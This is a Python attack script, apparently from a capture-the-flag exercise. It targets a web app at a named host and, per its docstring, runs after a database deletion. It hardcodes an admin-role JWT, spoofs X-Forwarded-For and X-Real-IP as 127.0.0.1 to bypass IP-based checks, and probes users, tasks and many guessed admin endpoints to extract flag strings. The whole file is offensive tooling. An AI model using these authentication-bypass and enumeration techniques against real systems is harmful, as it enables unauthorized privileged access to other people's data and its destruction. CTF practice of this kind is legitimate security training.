#!/usr/bin/env python3
"""
Check for flag after database deletion
"""

import requests
import json
import re

base_url = "http://fresh-start-267.emergent.host"
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYTcyMWZjYzEtMTk5OS00NGViLWJjOTQtMDU0YjU4N2E2MDUzIiwiZW1haWwiOiJhZG1pbkBldGhhcmEuYWkiLCJuYW1lIjoiU3lzdGVtIEFkbWluIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzc3NTMzMTI2fQ.Lu6aYqa4j4EQHX463APGH0n73p_ziCQn3luWUSi-61U"

headers = {
    "Authorization": f"Bearer {token}",
    "X-Forwarded-For": "127.0.0.1",
    "X-Real-IP": "127.0.0.1",
}

print("="*60)
print("CHECKING FOR FLAG")
print("="*60)

# Check how many users left
print("\n[1] Checking remaining users...")
try:
    resp = requests.get(f"{base_url}/api/users", headers=headers, timeout=10)
    if resp.status_code == 200:
        users = resp.json()
        print(f"[+] Remaining users: {len(users)}")
        
        # Check if response contains flag
        text = json.dumps(users)
        if 'flag{' in text.lower() or 'ethara{' in text.lower():
            print("[!!!] FLAG FOUND IN USERS RESPONSE!")
            print(text)
    else:
        print(f"Status: {resp.status_code}")
        print(f"Response: {resp.text[:500]}")
except Exception as e:
    print(f"Error: {e}")

# Check tasks
print("\n[2] Checking tasks...")
try:
    resp = requests.get(f"{base_url}/api/tasks", headers=headers, timeout=10)
    if resp.status_code == 200:
        tasks = resp.json()
        print(f"[+] Remaining tasks: {len(tasks)}")
        
        # Check if response contains flag
        text = json.dumps(tasks)
        if 'flag{' in text.lower() or 'ethara{' in text.lower():
            print("[!!!] FLAG FOUND IN TASKS RESPONSE!")
            print(text)
    else:
        print(f"Status: {resp.status_code}")
        print(f"Response: {resp.text[:500]}")
except Exception as e:
    print(f"Error: {e}")

# Check all possible flag endpoints
flag_endpoints = [
    '/api/flag',
    '/api/admin/flag',
    '/flag',
    '/admin/flag',
    '/api/success',
    '/api/admin/success',
    '/api/admin',
    '/api/admin/stats',
    '/api/stats',
    '/api/admin/database',
    '/api/database',
    '/api/admin/deleted',
    '/api/deleted',
]

print("\n[3] Checking flag endpoints...")
for endpoint in flag_endpoints:
    try:
        resp = requests.get(f"{base_url}{endpoint}", headers=headers, timeout=5)
        
        if resp.status_code == 200:
            text = resp.text
            
            # Check for flag patterns
            if 'flag{' in text.lower() or 'ethara{' in text.lower() or 'ctf{' in text.lower():
                print(f"\n[!!!] FLAG FOUND AT {endpoint}!")
                print(f"Response: {text[:1000]}")
                
                # Extract flag
                flags = re.findall(r'(flag\{[^}]+\}|ethara\{[^}]+\}|ctf\{[^}]+\})', text, re.IGNORECASE)
                if flags:
                    print(f"\n[!!!] EXTRACTED FLAGS:")
                    for flag in flags:
                        print(f"    {flag}")
            
            # Check JSON
            try:
                data = resp.json()
                json_str = json.dumps(data)
                if 'flag' in json_str.lower() or 'success' in json_str.lower():
                    print(f"\n[+] {endpoint}: {resp.status_code}")
                    print(f"Response: {json.dumps(data, indent=2)[:500]}")
            except:
                pass
                
    except Exception as e:
        pass

print("\n" + "="*60)
print("CHECK COMPLETE")
print("="*60)
